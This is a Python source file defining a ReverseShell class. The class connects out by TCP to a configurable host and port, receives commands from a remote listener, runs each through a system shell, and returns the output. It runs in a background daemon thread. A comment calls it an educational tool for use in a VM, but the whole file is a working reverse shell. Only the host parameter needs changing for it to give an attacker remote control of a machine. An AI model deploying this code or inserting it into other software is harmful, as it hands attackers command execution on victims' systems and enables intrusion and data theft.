import socket
import subprocess
import threading
import os
import sys

class ReverseShell:
    def __init__(self, host="127.0.0.1", port=5050):
        self.host = host
        self.port = port
        self.connected = False
        self.sock = None
        self.thread = None

    def _connect_and_shell(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.connected = True
            
            # Send initial identifying info
            self.sock.send(b"[SYSTEM] Reverse Shell Initialized. Ready for commands.\n")
            
            while self.connected:
                # Receive command from listener
                data = self.sock.recv(1024).decode("utf-8").strip()
                if not data or data.lower() == "quit":
                    break
                
                # Execute command
                try:
                    # Caution: This is a REAL shell for educational purposes in a VM
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout, stderr = proc.communicate()
                    output = stdout + stderr
                    if not output:
                        output = b"[Command executed with no output]\n"
                    self.sock.send(output)
                except Exception as e:
                    self.sock.send(f"Error: {str(e)}\n".encode("utf-8"))
            
            self.sock.close()
        except Exception:
            self.connected = False
        finally:
            self.connected = False

    def start(self):
        if not self.connected:
            self.thread = threading.Thread(target=self._connect_and_shell, daemon=True)
            self.thread.start()

    def stop(self):
        self.connected = False
        if self.sock:
            self.sock.close()
